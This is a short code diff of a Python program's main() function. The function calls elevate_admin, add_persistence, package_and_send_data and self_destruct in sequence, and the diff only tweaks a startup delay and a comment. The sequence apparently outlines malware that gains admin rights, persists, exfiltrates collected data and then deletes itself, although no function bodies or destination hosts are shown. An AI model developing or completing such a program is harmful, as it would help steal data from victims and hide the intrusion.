@@ -10,7 +10,7 @@ def main():
     elevate_admin()
     
     # Startup delay
-    startup_delay(30)
+    startup_delay()
     
     # Persistence
     add_persistence()
@@ -18,7 +18,7 @@ def main():
     # Collect and send data
     package_and_send_data()
     
-    # Self-destruct if enabled
+    # Self-destruct
     self_destruct()
 
 if __name__ == "__main__":
